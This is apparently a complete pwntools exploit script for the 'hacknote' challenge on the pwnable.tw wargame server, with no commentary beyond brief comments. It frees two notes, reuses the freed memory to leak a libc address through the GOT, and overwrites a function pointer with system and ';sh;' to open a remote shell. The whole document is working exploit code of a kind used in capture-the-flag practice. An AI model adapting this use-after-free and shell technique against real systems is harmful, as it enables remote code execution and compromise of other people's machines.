from pwn import *

libc = ELF("./libc_32.so.6")
binary = ELF("./hacknote")

def add(size, content):
	print p.recv()
	p.send("1")
	print p.recv()
	p.send(str(size))
	print p.recv()
	p.send(content)

def delete(idx):
	print p.recv()
	p.send("2")
	print p.recv()
	p.send(str(idx))

def run(idx):
	print p.recv()
	p.send("3")
	print p.recv()
	p.send(str(idx))

#p = process("./hacknote", env={"LD_PRELOAD": "./libc_32.so.6"})
p = remote("chall.pwnable.tw", 10102)
add(64, "a"*32)
add(64, "b"*32)
delete(1)
delete(0)

# leak libc base
add(8, p32(0x0804862B)+p32(binary.got['read']))
run(1)
print p.recv()
leaked = u32(p.recv(4))
libc_base = leaked - (0xf76f41c0-0xf7620000)
log.info("leaked = " + hex(leaked))
log.info("libc_base = " + hex(libc_base))
delete(3)

# exploit
add(8, p32(libc_base+libc.symbols['system'])+";sh;")
run(1)
print p.recv()
p.interactive()

